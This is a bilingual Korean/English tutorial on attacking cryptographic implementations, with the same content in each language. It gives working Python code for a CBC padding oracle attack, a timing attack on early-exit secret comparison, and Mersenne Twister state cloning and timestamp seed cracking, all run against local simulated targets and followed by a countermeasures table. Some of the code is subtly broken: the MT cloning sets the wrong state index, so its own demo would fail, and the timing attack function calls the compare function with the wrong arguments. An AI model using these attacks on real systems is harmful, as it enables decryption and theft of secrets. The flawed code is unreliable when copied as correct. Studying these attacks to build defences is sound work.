> 🌐 **Language / 언어**: [🇰🇷 한국어](#한국어) | [🇺🇸 English](#english)

---

<a name="한국어"></a>

# 암호화 구현 취약점 공격 — 패딩 오라클·타이밍 공격·약한 난수

## 1. 암호화 구현 취약점 분류

```
암호화 구현 취약점
    │
    ├── 패딩 오라클 공격
    │     - CBC 모드 패딩 검증 오류 노출
    │     - 바이트 단위 평문 복구
    │
    ├── 타이밍 공격
    │     - 비밀값 비교 시 조기 종료
    │     - 실행 시간 차이로 정보 유출
    │
    ├── 약한 난수 생성기
    │     - Mersenne Twister 상태 복구
    │     - 시드 예측 (타임스탬프 기반)
    │
    └── 재사용 IV/Nonce
          - CTR/GCM 모드 논스 재사용
          - 평문 XOR로 두 메시지 복구
```

---

## 2. 패딩 오라클 공격

```python
#!/usr/bin/env python3
"""CBC 패딩 오라클 공격 구현."""

import os
from typing import Callable

from Crypto.Cipher import AES
from Crypto.Util.Padding import pad, unpad


class PaddingOracleAttack:
    """CBC 패딩 오라클 공격 — 바이트별 평문 복구."""

    def __init__(self, oracle: Callable[[bytes, bytes], bool], block_size: int = 16) -> None:
        self.oracle = oracle
        self.block_size = block_size

    def decrypt_block(self, prev_block: bytes, curr_block: bytes) -> bytes:
        """단일 블록 복호화."""
        bs = self.block_size
        intermediate = bytearray(bs)

        for byte_pos in range(bs - 1, -1, -1):
            pad_byte = bs - byte_pos
            crafted = bytearray(bs)

            # 이미 알고 있는 바이트로 패딩 구성
            for k in range(byte_pos + 1, bs):
                crafted[k] = intermediate[k] ^ pad_byte

            found = False
            for guess in range(256):
                crafted[byte_pos] = guess
                if self.oracle(bytes(crafted), curr_block):
                    intermediate[byte_pos] = guess ^ pad_byte
                    found = True
                    break

            if not found:
                raise ValueError(f"바이트 {byte_pos} 복호화 실패")

        # 평문 = intermediate XOR 원래 이전 블록
        return bytes(intermediate[i] ^ prev_block[i] for i in range(bs))

    def decrypt(self, iv: bytes, ciphertext: bytes) -> bytes:
        """전체 암호문 복호화."""
        bs = self.block_size
        blocks = [iv] + [ciphertext[i:i+bs] for i in range(0, len(ciphertext), bs)]
        plaintext = b""

        for i in range(1, len(blocks)):
            plaintext += self.decrypt_block(blocks[i-1], blocks[i])

        # PKCS#7 패딩 제거
        pad_len = plaintext[-1]
        if 1 <= pad_len <= bs:
            plaintext = plaintext[:-pad_len]
        return plaintext


def simulate_oracle(key: bytes) -> Callable[[bytes, bytes], bool]:
    """테스트용 패딩 오라클 생성."""
    def oracle(iv: bytes, ciphertext: bytes) -> bool:
        try:
            cipher = AES.new(key, AES.MODE_CBC, iv)
            unpad(cipher.decrypt(ciphertext), 16)
            return True
        except ValueError:
            return False
    return oracle


if __name__ == "__main__":
    key = os.urandom(16)
    iv  = os.urandom(16)

    message = b"Secret: admin=true"
    cipher = AES.new(key, AES.MODE_CBC, iv)
    ct = cipher.encrypt(pad(message, 16))

    oracle = simulate_oracle(key)
    attack = PaddingOracleAttack(oracle)
    recovered = attack.decrypt(iv, ct)

    print(f"원본:   {message}")
    print(f"복호화: {recovered}")
    assert recovered == message
    print("[+] 패딩 오라클 공격 성공!")
```

---

## 3. 타이밍 공격

```python
#!/usr/bin/env python3
"""타이밍 공격 — 비밀 비교 함수의 시간 차이 측정."""

import hmac
import statistics
import time


def measure_response_time(func, *args, rounds: int = 100) -> float:
    """함수 실행 시간 통계 측정."""
    times = []
    for _ in range(rounds):
        start = time.perf_counter_ns()
        func(*args)
        end = time.perf_counter_ns()
        times.append(end - start)
    return statistics.median(times)


def vulnerable_compare(a: bytes, b: bytes) -> bool:
    """취약한 비교 — 조기 종료 (타이밍 공격에 취약)."""
    if len(a) != len(b):
        return False
    for x, y in zip(a, b):
        if x != y:
            return False  # 첫 불일치 즉시 반환
    return True


def safe_compare(a: bytes, b: bytes) -> bool:
    """안전한 비교 — hmac.compare_digest 사용."""
    return hmac.compare_digest(a, b)


def timing_attack_local(
    secret: bytes,
    candidate_fn: callable,
    charset: bytes = b"0123456789abcdef",
    rounds: int = 200,
) -> bytes:
    """
    타이밍 공격으로 비밀 값 복구.
    candidate_fn(guess) → bool: 취약한 비교 함수
    """
    recovered = b""
    for pos in range(len(secret)):
        best_char = b"\x00"
        best_time = 0.0

        for char in charset:
            guess = recovered + bytes([char]) + b"\x00" * (len(secret) - pos - 1)
            elapsed = measure_response_time(candidate_fn, guess, rounds=rounds)

            if elapsed > best_time:
                best_time = elapsed
                best_char = bytes([char])

        recovered += best_char
        print(f"[*] 위치 {pos}: {best_char.decode()} (시간: {best_time:.1f}ns)")

    return recovered


def detect_timing_vulnerability(
    compare_fn: callable,
    test_secret: bytes = b"test_secret_12345",
    rounds: int = 500,
) -> bool:
    """타이밍 취약점 존재 여부 탐지."""
    # 첫 바이트 일치 vs 불일치 시간 비교
    correct_first = test_secret[:1] + b"\x00" * (len(test_secret) - 1)
    wrong_first   = b"\xff" + b"\x00" * (len(test_secret) - 1)

    time_correct = measure_response_time(compare_fn, test_secret, correct_first, rounds=rounds)
    time_wrong   = measure_response_time(compare_fn, test_secret, wrong_first, rounds=rounds)

    diff = abs(time_correct - time_wrong)
    print(f"  첫 바이트 일치 시간:   {time_correct:.1f}ns")
    print(f"  첫 바이트 불일치 시간: {time_wrong:.1f}ns")
    print(f"  시간 차이:             {diff:.1f}ns")

    return diff > 500  # 500ns 이상 차이 → 취약


if __name__ == "__main__":
    secret = b"deadbeef"
    print("=== 취약한 비교 함수 ===")
    vuln = detect_timing_vulnerability(vulnerable_compare, secret)
    print(f"  취약점 탐지: {'예' if vuln else '아니오'}\n")

    print("=== 안전한 비교 함수 ===")
    safe = detect_timing_vulnerability(safe_compare, secret)
    print(f"  취약점 탐지: {'예' if safe else '아니오'}")
```

---

## 4. Mersenne Twister 상태 복구

```python
#!/usr/bin/env python3
"""MT19937 난수 생성기 상태 복구 및 예측."""

import random
import struct


def untemper(y: int) -> int:
    """MT19937 템퍼링 역변환."""
    # 역변환 상수
    # y ^= y >> 18
    y ^= y >> 18
    # y ^= (y << 15) & 0xEFC60000
    y ^= (y << 15) & 0xEFC60000
    # y ^= (y << 7) & 0x9D2C5680 — 여러 단계 필요
    tmp = y
    for _ in range(4):
        tmp = y ^ ((tmp << 7) & 0x9D2C5680)
    y = tmp
    # y ^= y >> 11 — 여러 단계 필요
    tmp = y
    for _ in range(3):
        tmp = y ^ (tmp >> 11)
    return tmp


def clone_mt19937(outputs: list[int]) -> random.Random:
    """624개 출력으로 MT 상태 복제."""
    if len(outputs) < 624:
        raise ValueError("624개 이상의 출력 필요")

    state = [untemper(v) for v in outputs[:624]]

    # random.Random 객체에 상태 주입
    rng = random.Random()
    rng.setstate((3, tuple(state + [0]), None))
    return rng


def crack_mt19937_seed_time(target_output: int, time_window: int = 1000) -> int | None:
    """
    타임스탬프 시드 크래킹.
    현재 시간 기준 ±time_window 초 범위에서 시드 탐색.
    """
    import time
    now = int(time.time())

    for seed in range(now - time_window, now + time_window):
        rng = random.Random(seed)
        if rng.getrandbits(32) == target_output:
            return seed
    return None


if __name__ == "__main__":
    # MT 상태 복제 시연
    rng = random.Random()
    outputs = [rng.getrandbits(32) for _ in range(624)]

    cloned = clone_mt19937(outputs)
    next_original = rng.getrandbits(32)
    next_cloned   = cloned.getrandbits(32)

    print(f"원본 다음 값:  {next_original}")
    print(f"복제된 다음 값: {next_cloned}")
    assert next_original == next_cloned
    print("[+] MT19937 상태 복제 성공!")
```

---

## 5. 취약점 요약 표

| 취약점 | 원인 | 탐지 방법 | 방어 대책 |
|--------|------|-----------|-----------|
| 패딩 오라클 | CBC 패딩 에러 노출 | 응답 내용/시간 차이 | AEAD 모드 사용 (GCM) |
| 타이밍 공격 | 조기 종료 비교 | 시간 통계 분석 | hmac.compare_digest |
| MT 예측 | 624개 출력으로 상태 복구 | 출력 수집 | secrets 모듈 사용 |
| 시드 예측 | 타임스탬프 시드 | 브루트포스 | os.urandom() |
| Nonce 재사용 | CTR/GCM IV 중복 | 암호문 XOR | 랜덤 12바이트 nonce |

---

<a name="english"></a>

# Crypto Implementation Attacks — Padding Oracle, Timing Attacks, Weak RNG

## 1. Cryptographic Implementation Vulnerability Classification

```
Crypto Implementation Vulnerabilities
    │
    ├── Padding Oracle Attack
    │     - Leaking CBC mode padding validation errors
    │     - Byte-by-byte plaintext recovery
    │
    ├── Timing Attack
    │     - Early termination during secret comparison
    │     - Information leakage via execution time differences
    │
    ├── Weak Random Number Generator
    │     - Mersenne Twister state recovery
    │     - Seed prediction (timestamp-based)
    │
    └── IV/Nonce Reuse
          - CTR/GCM mode nonce reuse
          - Recovering two messages via XOR of plaintexts
```

---

## 2. Padding Oracle Attack

```python
#!/usr/bin/env python3
"""CBC padding oracle attack implementation."""

import os
from typing import Callable

from Crypto.Cipher import AES
from Crypto.Util.Padding import pad, unpad


class PaddingOracleAttack:
    """CBC Padding Oracle Attack — byte-by-byte plaintext recovery."""

    def __init__(self, oracle: Callable[[bytes, bytes], bool], block_size: int = 16) -> None:
        self.oracle = oracle
        self.block_size = block_size

    def decrypt_block(self, prev_block: bytes, curr_block: bytes) -> bytes:
        """Decrypt a single block."""
        bs = self.block_size
        intermediate = bytearray(bs)

        for byte_pos in range(bs - 1, -1, -1):
            pad_byte = bs - byte_pos
            crafted = bytearray(bs)

            # Build padding using already-known bytes
            for k in range(byte_pos + 1, bs):
                crafted[k] = intermediate[k] ^ pad_byte

            found = False
            for guess in range(256):
                crafted[byte_pos] = guess
                if self.oracle(bytes(crafted), curr_block):
                    intermediate[byte_pos] = guess ^ pad_byte
                    found = True
                    break

            if not found:
                raise ValueError(f"Failed to decrypt byte {byte_pos}")

        # Plaintext = intermediate XOR original previous block
        return bytes(intermediate[i] ^ prev_block[i] for i in range(bs))

    def decrypt(self, iv: bytes, ciphertext: bytes) -> bytes:
        """Decrypt the full ciphertext."""
        bs = self.block_size
        blocks = [iv] + [ciphertext[i:i+bs] for i in range(0, len(ciphertext), bs)]
        plaintext = b""

        for i in range(1, len(blocks)):
            plaintext += self.decrypt_block(blocks[i-1], blocks[i])

        # Remove PKCS#7 padding
        pad_len = plaintext[-1]
        if 1 <= pad_len <= bs:
            plaintext = plaintext[:-pad_len]
        return plaintext


def simulate_oracle(key: bytes) -> Callable[[bytes, bytes], bool]:
    """Create a padding oracle for testing."""
    def oracle(iv: bytes, ciphertext: bytes) -> bool:
        try:
            cipher = AES.new(key, AES.MODE_CBC, iv)
            unpad(cipher.decrypt(ciphertext), 16)
            return True
        except ValueError:
            return False
    return oracle


if __name__ == "__main__":
    key = os.urandom(16)
    iv  = os.urandom(16)

    message = b"Secret: admin=true"
    cipher = AES.new(key, AES.MODE_CBC, iv)
    ct = cipher.encrypt(pad(message, 16))

    oracle = simulate_oracle(key)
    attack = PaddingOracleAttack(oracle)
    recovered = attack.decrypt(iv, ct)

    print(f"Original:  {message}")
    print(f"Decrypted: {recovered}")
    assert recovered == message
    print("[+] Padding oracle attack successful!")
```

---

## 3. Timing Attack

```python
#!/usr/bin/env python3
"""Timing attack — measuring time differences in secret comparison functions."""

import hmac
import statistics
import time


def measure_response_time(func, *args, rounds: int = 100) -> float:
    """Measure function execution time statistics."""
    times = []
    for _ in range(rounds):
        start = time.perf_counter_ns()
        func(*args)
        end = time.perf_counter_ns()
        times.append(end - start)
    return statistics.median(times)


def vulnerable_compare(a: bytes, b: bytes) -> bool:
    """Vulnerable comparison — early termination (susceptible to timing attacks)."""
    if len(a) != len(b):
        return False
    for x, y in zip(a, b):
        if x != y:
            return False  # Return immediately on first mismatch
    return True


def safe_compare(a: bytes, b: bytes) -> bool:
    """Safe comparison — uses hmac.compare_digest."""
    return hmac.compare_digest(a, b)


def timing_attack_local(
    secret: bytes,
    candidate_fn: callable,
    charset: bytes = b"0123456789abcdef",
    rounds: int = 200,
) -> bytes:
    """
    Recover secret value via timing attack.
    candidate_fn(guess) → bool: vulnerable comparison function
    """
    recovered = b""
    for pos in range(len(secret)):
        best_char = b"\x00"
        best_time = 0.0

        for char in charset:
            guess = recovered + bytes([char]) + b"\x00" * (len(secret) - pos - 1)
            elapsed = measure_response_time(candidate_fn, guess, rounds=rounds)

            if elapsed > best_time:
                best_time = elapsed
                best_char = bytes([char])

        recovered += best_char
        print(f"[*] Position {pos}: {best_char.decode()} (time: {best_time:.1f}ns)")

    return recovered


def detect_timing_vulnerability(
    compare_fn: callable,
    test_secret: bytes = b"test_secret_12345",
    rounds: int = 500,
) -> bool:
    """Detect whether a timing vulnerability exists."""
    # Compare timing: first byte match vs mismatch
    correct_first = test_secret[:1] + b"\x00" * (len(test_secret) - 1)
    wrong_first   = b"\xff" + b"\x00" * (len(test_secret) - 1)

    time_correct = measure_response_time(compare_fn, test_secret, correct_first, rounds=rounds)
    time_wrong   = measure_response_time(compare_fn, test_secret, wrong_first, rounds=rounds)

    diff = abs(time_correct - time_wrong)
    print(f"  First byte match time:    {time_correct:.1f}ns")
    print(f"  First byte mismatch time: {time_wrong:.1f}ns")
    print(f"  Time difference:          {diff:.1f}ns")

    return diff > 500  # Difference > 500ns → vulnerable


if __name__ == "__main__":
    secret = b"deadbeef"
    print("=== Vulnerable comparison function ===")
    vuln = detect_timing_vulnerability(vulnerable_compare, secret)
    print(f"  Vulnerability detected: {'Yes' if vuln else 'No'}\n")

    print("=== Safe comparison function ===")
    safe = detect_timing_vulnerability(safe_compare, secret)
    print(f"  Vulnerability detected: {'Yes' if safe else 'No'}")
```

---

## 4. Mersenne Twister State Recovery

```python
#!/usr/bin/env python3
"""MT19937 RNG state recovery and prediction."""

import random
import struct


def untemper(y: int) -> int:
    """Reverse the MT19937 tempering transformation."""
    # Reverse y ^= y >> 18
    y ^= y >> 18
    # Reverse y ^= (y << 15) & 0xEFC60000
    y ^= (y << 15) & 0xEFC60000
    # Reverse y ^= (y << 7) & 0x9D2C5680 — requires multiple steps
    tmp = y
    for _ in range(4):
        tmp = y ^ ((tmp << 7) & 0x9D2C5680)
    y = tmp
    # Reverse y ^= y >> 11 — requires multiple steps
    tmp = y
    for _ in range(3):
        tmp = y ^ (tmp >> 11)
    return tmp


def clone_mt19937(outputs: list[int]) -> random.Random:
    """Clone MT state from 624 outputs."""
    if len(outputs) < 624:
        raise ValueError("Need at least 624 outputs")

    state = [untemper(v) for v in outputs[:624]]

    # Inject state into random.Random object
    rng = random.Random()
    rng.setstate((3, tuple(state + [0]), None))
    return rng


def crack_mt19937_seed_time(target_output: int, time_window: int = 1000) -> int | None:
    """
    Crack timestamp-based seed.
    Search for seed in ±time_window seconds from current time.
    """
    import time
    now = int(time.time())

    for seed in range(now - time_window, now + time_window):
        rng = random.Random(seed)
        if rng.getrandbits(32) == target_output:
            return seed
    return None


if __name__ == "__main__":
    # Demonstrate MT state cloning
    rng = random.Random()
    outputs = [rng.getrandbits(32) for _ in range(624)]

    cloned = clone_mt19937(outputs)
    next_original = rng.getrandbits(32)
    next_cloned   = cloned.getrandbits(32)

    print(f"Original next value: {next_original}")
    print(f"Cloned next value:   {next_cloned}")
    assert next_original == next_cloned
    print("[+] MT19937 state cloning successful!")
```

---

## 5. Vulnerability Summary Table

| Vulnerability | Cause | Detection Method | Countermeasure |
|---------------|-------|-----------------|----------------|
| Padding oracle | CBC padding error exposure | Response content/time difference | Use AEAD mode (GCM) |
| Timing attack | Early termination comparison | Statistical time analysis | hmac.compare_digest |
| MT prediction | State recovery from 624 outputs | Collect outputs | Use secrets module |
| Seed prediction | Timestamp-based seed | Brute force | os.urandom() |
| Nonce reuse | CTR/GCM IV duplication | XOR of ciphertexts | Random 12-byte nonce |
